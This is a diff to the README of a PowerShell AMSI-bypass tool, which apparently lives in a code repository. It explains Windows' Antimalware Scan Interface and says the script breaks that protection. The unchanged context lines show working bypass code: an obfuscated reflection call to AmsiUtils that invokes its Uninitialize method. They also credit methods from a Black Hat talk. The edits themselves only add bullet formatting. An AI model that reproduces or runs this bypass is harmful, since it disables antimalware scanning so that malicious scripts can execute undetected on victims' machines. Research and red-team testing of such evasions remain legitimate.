@@ -14,7 +14,7 @@
 
 AMSI stands for "Antimalware Scan Interface." It is a Microsoft Windows interface that allows antivirus and other security software to scan scripts and other types of content in memory, before they are executed. This allows the security software to detect and prevent the execution of malicious scripts, such as those used by malware or other types of cyber threats. AMSI was introduced in Windows 10 and is also supported in Windows Server 2016 and later versions. This script essentially breaks the AMSI protection by breaking one of the components in the AMSI chain.
 
-This script can run on any of [these](./static/VERSIONS.md) versions of Windows.
+- This script can run on any of [these](./static/VERSIONS.md) versions of Windows.
 
 ### Usage
 ---
@@ -44,7 +44,7 @@ $object = [Ref].Assembly.GetType('System.Management.Automation.Ams'+'iUtils')
 $Uninitialize = $object.GetMethods("NonPublic,static") | Where-Object Name -eq Uninitialize
 $Uninitialize.Invoke($object,$null)
 ```
-AMSI (Antimalware Scan Interface) Bypass created By Maor Korkos https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf | Page 43
+- AMSI (Antimalware Scan Interface) Bypass created By Maor Korkos https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf | Page 43
 
 
 ### 2nd Method by Maor Korkos
@@ -68,11 +68,11 @@ $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt32($Ant
 }
 ```
 
-AMSI (Antimalware Scan Interface) Bypass created By Maor Korkos https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf | Page 51
+- AMSI (Antimalware Scan Interface) Bypass created By Maor Korkos https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf | Page 51
 
 
 ### Showcase
 
-Showcase of this script in action
+ - Showcase of this script in action:
 
 <a href="./static/amsibreaktutorial.png"><img src="./static/amsibreaktutorial.png" width="2560" alt="Showcase" /></a>
